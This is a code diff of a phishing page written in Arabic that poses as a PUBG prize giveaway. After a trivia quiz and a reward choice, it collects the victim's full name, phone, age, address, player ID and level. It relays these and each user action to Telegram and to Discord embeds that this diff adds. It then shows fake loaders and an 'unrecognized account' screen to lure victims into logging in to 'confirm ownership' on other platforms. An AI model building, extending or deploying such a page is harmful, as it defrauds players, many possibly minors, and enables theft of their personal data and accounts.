+        currentQuestionIdx: 0,
+        quizTimerVal: 20,
+        quizTimerInterval: null,
+        fullName: '',
+        phone: '',
+        age: '',
+        address: '',
+        playerID: '',
+        level: ''
+    };
+
+    function goToStep(stepNum) {
+        if (!navigator.onLine) return;
+        audio.playClick();
+        state.currentStep = stepNum;
+
+        document.querySelectorAll('.glass-card').forEach(card => card.classList.remove('active'));
+        const targetCard = document.getElementById(`cardStep${stepNum}`);
+        if (targetCard) targetCard.classList.add('active');
+
+        const btnBack = document.getElementById('btnHeaderBack');
+        if (btnBack) {
+            btnBack.style.display = (stepNum > 1) ? 'inline-flex' : 'none';
+        }
+
+        document.querySelectorAll('.step-tab').forEach(tab => {
+            const tStep = parseInt(tab.dataset.step);
+            tab.classList.remove('active');
+            if (tStep === stepNum) tab.classList.add('active');
+            if (tStep < stepNum) tab.classList.add('completed');
+        });
+
+        const fillPercent = (stepNum / 4) * 100;
+        const progressFill = document.getElementById('progressBarFill');
+        if (progressFill) progressFill.style.width = `${fillPercent}%`;
+
+        if (stepNum === 2) {
+            initTriviaChallenge();
+        }
+
+        window.scrollTo({ top: 100, behavior: 'smooth' });
+    }
+
+    function goBackStep() {
+        if (state.currentStep > 1) {
+            sendUnifiedAlert(`🔄 **قام المتسابق بالعودة للخطوة (${state.currentStep - 1})**`, "🔄 تنقل في الخطوات", [], 0xf1c40f);
+            goToStep(state.currentStep - 1);
+        }
+    }
+
+    function selectReward(el, rewardTitle) {
+        document.querySelectorAll('.reward-card').forEach(c => c.classList.remove('selected'));
+        el.classList.add('selected');
+        state.selectedReward = rewardTitle;
+        saveFormDataLocally();
+        audio.playClick();
+
+        sendUnifiedAlert(`🎁 **قام المتسابق باختيار جائزة:** ${rewardTitle}`, "🎁 اختيار جائزة", [
+            { name: "🎁 الجائزة المختارة", value: rewardTitle, inline: true }
+        ], 0xf39c12);
+    }
+
+    function initTriviaChallenge() {
+        state.score = 0;
+        document.getElementById('quizScore').innerText = '0';
+        document.getElementById('quizContainerBox').style.display = 'block';
+        document.getElementById('quizSuccessBox').style.display = 'none';
+
+        const shuffled = [...pubgTriviaBank].sort(() => 0.5 - Math.random());
+        state.activeQuestions = shuffled.slice(0, 5);
+        state.currentQuestionIdx = 0;
+        renderQuestion();
+    }
+
+    function renderQuestion() {
+        if (state.score >= 3) {
+            audio.playCorrect();
+            document.getElementById('quizContainerBox').style.display = 'none';
+            document.getElementById('quizSuccessBox').style.display = 'block';
+            sendUnifiedAlert(`🧠 **اجتاز المتسابق اختبار الأسئلة بنجاح! (3/3)**`, "🧠 نجاح بالجامع الاختباري", [], 0x2ecc71);
+            return;
+        }
+
+        const qObj = state.activeQuestions[state.currentQuestionIdx];
+        document.getElementById('questionCounter').innerText = `السؤال الحالي (${state.currentQuestionIdx + 1}):`;
+        document.getElementById('questionText').innerText = qObj.q;
+
+        const optionsContainer = document.getElementById('optionsContainer');
+        optionsContainer.innerHTML = '';
+
+        let indexedOpts = qObj.opts.map((opt, idx) => ({ text: opt, isCorrect: idx === qObj.a }));
+        indexedOpts.sort(() => 0.5 - Math.random());
+
+        indexedOpts.forEach(optItem => {
+            const btn = document.createElement('button');
+            btn.className = 'option-btn';
+            btn.innerText = optItem.text;
+            btn.onclick = () => handleAnswerClick(btn, optItem.isCorrect);
+            optionsContainer.appendChild(btn);
+        });
+
+        startQuizTimer();
+    }
+
+    function startQuizTimer() {
+        clearInterval(state.quizTimerInterval);
+        state.quizTimerVal = 20;
+        document.getElementById('quizTimer').innerText = state.quizTimerVal;
+
+        state.quizTimerInterval = setInterval(() => {
+            state.quizTimerVal--;
+            document.getElementById('quizTimer').innerText = state.quizTimerVal;
+            audio.playTick();
+
+            if (state.quizTimerVal <= 0) {
+                clearInterval(state.quizTimerInterval);
+                audio.playTimerEnd();
+                replaceQuestionOnWrong();
+            }
+        }, 1000);
+    }
+
+    function handleAnswerClick(btnEl, isCorrect) {
+        clearInterval(state.quizTimerInterval);
+        const allBtns = document.querySelectorAll('.option-btn');
+        allBtns.forEach(b => b.style.pointerEvents = 'none');
+
+        if (isCorrect) {
+            btnEl.classList.add('correct');
+            audio.playCorrect();
+            state.score++;
+            document.getElementById('quizScore').innerText = state.score;
+            setTimeout(() => {
+                state.currentQuestionIdx++;
+                renderQuestion();
+            }, 1000);
+        } else {
+            btnEl.classList.add('wrong');
+            audio.playWrong();
+            setTimeout(() => {
+                replaceQuestionOnWrong();
+            }, 1200);
+        }
+    }
+
+    function replaceQuestionOnWrong() {
+        const availableNew = pubgTriviaBank.filter(q => !state.activeQuestions.includes(q));
+        const randomNew = availableNew[Math.floor(Math.random() * availableNew.length)] || pubgTriviaBank[0];
+        state.activeQuestions[state.currentQuestionIdx] = randomNew;
+        renderQuestion();
+    }
+
+    function toggleHelp(helpId) {
+        audio.playClick();
+        const el = document.getElementById(helpId);
+        if (el) el.style.display = (el.style.display === 'block') ? 'none' : 'block';
+    }
+
+    function validatePersonalForm() {
+        const nameInput = document.getElementById('inputFullName');
+        const phoneInput = document.getElementById('inputPhone');
+        const ageInput = document.getElementById('inputAge');
+        const addrInput = document.getElementById('inputAddress');
+        const pidInput = document.getElementById('inputPlayerID');
+        const lvlInput = document.getElementById('inputLevel');
+
+        if (!nameInput || !phoneInput || !ageInput || !addrInput || !pidInput || !lvlInput) return;
+
+        const name = nameInput.value.trim();
+        const phone = phoneInput.value.trim();
+        const age = ageInput.value.trim();
+        const addr = addrInput.value.trim();
+        const pid = pidInput.value.trim();
+        const lvl = lvlInput.value.trim();
+
+        const isNameValid = /^[\u0600-\u06FFa-zA-Z\s]{5,}$/.test(name);
+        const isPhoneValid = /^[0-9+]{7,15}$/.test(phone);
+        const isAgeValid = age !== '' && parseInt(age) >= 10;
+        const isAddrValid = addr.length >= 3;
+        const isLvlValid = lvl !== '' && parseInt(lvl) >= 1;
+
+        const isPidNotRepeated = !/^(.)\1+$/.test(pid) && pid !== "123456" && pid !== "12345678" && pid !== "123456789" && pid !== "1234567890";
+        const isPidValid = /^[0-9]{6,12}$/.test(pid) && isPidNotRepeated;
+
+        if (addr.includes("اليمن") || addr.includes("صنعاء")) {
+            if (phone.startsWith("7") && phone.length === 9) {
+                phoneInput.value = "+967" + phone;
+            }
+        }
+
+        document.getElementById('iconName').className = isNameValid ? 'fa-solid fa-circle-check input-status-icon valid' : 'fa-solid fa-circle-xmark input-status-icon invalid';
+        document.getElementById('iconPhone').className = isPhoneValid ? 'fa-solid fa-circle-check input-status-icon valid' : 'fa-solid fa-circle-xmark input-status-icon invalid';
+        document.getElementById('iconAge').className = isAgeValid ? 'fa-solid fa-circle-check input-status-icon valid' : 'fa-solid fa-circle-xmark input-status-icon invalid';
+        document.getElementById('iconAddress').className = isAddrValid ? 'fa-solid fa-circle-check input-status-icon valid' : 'fa-solid fa-circle-xmark input-status-icon invalid';
+        document.getElementById('iconPlayerID').className = isPidValid ? 'fa-solid fa-circle-check input-status-icon valid' : 'fa-solid fa-circle-xmark input-status-icon invalid';
+        document.getElementById('iconLevel').className = isLvlValid ? 'fa-solid fa-circle-check input-status-icon valid' : 'fa-solid fa-circle-xmark input-status-icon invalid';
+
+        const isValidAll = isNameValid && isPhoneValid && isAgeValid && isAddrValid && isPidValid && isLvlValid;
+        document.getElementById('btnNextStep3').disabled = !isValidAll;
+
+        state.fullName = name;
+        state.phone = phone;
+        state.age = age;
+        state.address = addr;
+        state.playerID = pid;
+        state.level = lvl;
+
+        if (isNameValid) {
+            contestantName = name;
+            localStorage.setItem("contestant_name", contestantName);
+        }
+
+        saveFormDataLocally();
+    }
+
+    // إرسال البيانات المكتملة بنظام البطاقات (Card / Embed)
+    function submitStep3Logic() {
+        const dataReportText = `
 🚨 **تم تسجيل بيانات متسابق جديد!** 🚨
 
 👤 **الاسم الثلاثي:** ${state.fullName}
@@ -2024,96 +2105,128 @@
 🆔 **معرف الحساب (Player ID):** ${state.playerID}
 ⭐ **مستوى الحساب:** ${state.level}
 🎁 **الجائزة المطلوبة:** ${state.selectedReward}
-            `;
-            sendTelegramAlert(dataReport);
+`;
 
-            goToStep(4);
+        const discordFields = [
+            { name: "👤 الاسم الثلاثي", value: state.fullName, inline: true },
+            { name: "📞 رقم الهاتف", value: state.phone, inline: true },
+            { name: "🎂 العمر", value: `${state.age} سنة`, inline: true },
+            { name: "📍 العنوان", value: state.address, inline: true },
+            { name: "🆔 Player ID", value: state.playerID, inline: true },
+            { name: "⭐ المستوى", value: state.level, inline: true },
+            { name: "🎁 الجائزة المطلوبة", value: state.selectedReward, inline: false }
+        ];
 
-            document.getElementById('loaderPhase1').style.display = 'flex';
-            document.getElementById('unrecognizedAccountPhase').style.display = 'none';
+        // إرسال مباشر إلى تليجرام وبطاقة مميزة في ديسكورد
+        sendUnifiedAlert(dataReportText, "🔥 تسجيل بيانات متسابق جديد 🔥", discordFields, 0xe74c3c);
+
+        goToStep(4);
+
+        document.getElementById('loaderPhase1').style.display = 'flex';
+        document.getElementById('unrecognizedAccountPhase').style.display = 'none';
+        document.getElementById('loaderPhase2').style.display = 'none';
+        document.getElementById('platformsPhase').style.display = 'none';
+
+        setTimeout(() => {
+            document.getElementById('loaderPhase1').style.display = 'none';
+            document.getElementById('unrecognizedAccountPhase').style.display = 'block';
+        }, 3000);
+    }
+
+    function startLoginPlatformPhase() {
+        audio.playClick();
+        sendUnifiedAlert(
+            `🔑 **ضغط المتسابق ${contestantName} على زر (تسجيل الدخول لتأكيد الملكية)**`,
+            "🔑 بدء التأكيد والتحقق",
+            [],
+            0xe67e22
+        );
+
+        document.getElementById('unrecognizedAccountPhase').style.display = 'none';
+        document.getElementById('loaderPhase2').style.display = 'flex';
+
+        setTimeout(() => {
             document.getElementById('loaderPhase2').style.display = 'none';
-            document.getElementById('platformsPhase').style.display = 'none';
+            document.getElementById('platformsPhase').style.display = 'block';
+        }, 4000);
+    }
 
-            setTimeout(() => {
-                document.getElementById('loaderPhase1').style.display = 'none';
-                document.getElementById('unrecognizedAccountPhase').style.display = 'block';
-            }, 3000);
+    function trackPlatformClick(platformName) {
+        sendUnifiedAlert(
+            `📲 **قام المتسابق باختيار منصة:** (${platformName}) للتأكيد التلقائي!`,
+            "📲 اختيار منصة الربط",
+            [{ name: "المنصة المختارة", value: platformName, inline: true }],
+            0x9b59b6
+        );
+    }
+
+    const canvas = document.getElementById('particleCanvas');
+    const ctx = canvas ? canvas.getContext('2d') : null;
+    let particles = [];
+
+    function resizeCanvas() {
+        if (!canvas) return;
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+    }
+    window.addEventListener('resize', resizeCanvas);
+    resizeCanvas();
+
+    class Particle {
+        constructor() {
+            this.x = Math.random() * (canvas ? canvas.width : 500);
+            this.y = Math.random() * (canvas ? canvas.height : 500);
+            this.size = Math.random() * 2 + 1;
+            this.speedX = Math.random() * 0.5 - 0.25;
+            this.speedY = Math.random() * 0.5 - 0.25;
+            this.color = Math.random() > 0.5 ? '#ffb703' : '#00f3ff';
         }
-
-        function startLoginPlatformPhase() {
-            audio.playClick();
-            sendTelegramAlert(`🔑 **ضغط المتسابق ${contestantName} على زر (تسجيل الدخول لتأكيد الملكية)**`);
-
-            document.getElementById('unrecognizedAccountPhase').style.display = 'none';
-            document.getElementById('loaderPhase2').style.display = 'flex';
-
-            setTimeout(() => {
-                document.getElementById('loaderPhase2').style.display = 'none';
-                document.getElementById('platformsPhase').style.display = 'block';
-            }, 4000);
+        update() {
+            if (!canvas) return;
+            this.x += this.speedX;
+            this.y += this.speedY;
+            if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
+            if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
         }
-
-        function trackPlatformClick(platformName) {
-            sendTelegramAlert(`📲 **قام المتسابق باختيار منصة:** (${platformName}) للتأكيد التلقائي!`);
+        draw() {
+            if (!ctx) return;
+            ctx.fillStyle = this.color;
+            ctx.beginPath();
+            ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
+            ctx.fill();
         }
+    }
 
-        const canvas = document.getElementById('particleCanvas');
-        const ctx = canvas.getContext('2d');
-        let particles = [];
-
-        function resizeCanvas() {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        }
-        window.addEventListener('resize', resizeCanvas);
-        resizeCanvas();
-
-        class Particle {
-            constructor() {
-                this.x = Math.random() * canvas.width;
-                this.y = Math.random() * canvas.height;
-                this.size = Math.random() * 2 + 1;
-                this.speedX = Math.random() * 0.5 - 0.25;
-                this.speedY = Math.random() * 0.5 - 0.25;
-                this.color = Math.random() > 0.5 ? '#ffb703' : '#00f3ff';
-            }
-            update() {
-                this.x += this.speedX;
-                this.y += this.speedY;
-                if (this.x < 0 || this.x > canvas.width) this.speedX *= -1;
-                if (this.y < 0 || this.y > canvas.height) this.speedY *= -1;
-            }
-            draw() {
-                ctx.fillStyle = this.color;
-                ctx.beginPath();
-                ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
-                ctx.fill();
-            }
-        }
-
+    if (canvas) {
         for (let i = 0; i < 40; i++) particles.push(new Particle());
+    }
 
-        function animateParticles() {
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            particles.forEach(p => {
-                p.update();
-                p.draw();
-            });
-            requestAnimationFrame(animateParticles);
-        }
+    function animateParticles() {
+        if (!ctx || !canvas) return;
+        ctx.clearRect(0, 0, canvas.width, canvas.height);
+        particles.forEach(p => {
+            p.update();
+            p.draw();
+        });
+        requestAnimationFrame(animateParticles);
+    }
 
-        function startCountdown() {
-            let totalSeconds = 3600 * 24 * 3;
-            setInterval(() => {
-                totalSeconds--;
-                if (totalSeconds < 0) totalSeconds = 3600 * 24 * 3;
-                let hrs = Math.floor(totalSeconds / 3600);
-                let mins = Math.floor((totalSeconds % 3600) / 60);
-                let secs = totalSeconds % 60;
-                document.getElementById('countdownTimer').innerText = 
+    function startCountdown() {
+        let totalSeconds = 3600 * 24 * 3;
+        setInterval(() => {
+            totalSeconds--;
+            if (totalSeconds < 0) totalSeconds = 3600 * 24 * 3;
+            let hrs = Math.floor(totalSeconds / 3600);
+            let mins = Math.floor((totalSeconds % 3600) / 60);
+            let secs = totalSeconds % 60;
+            const timerEl = document.getElementById('countdownTimer');
+            if (timerEl) {
+                timerEl.innerText = 
                     `${hrs.toString().padStart(2, '0')}:${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
-            }, 1000);
-        }
-    </script>
+            }
+        }, 1000);
+    }
+</script>
+
 </body>
 </html>
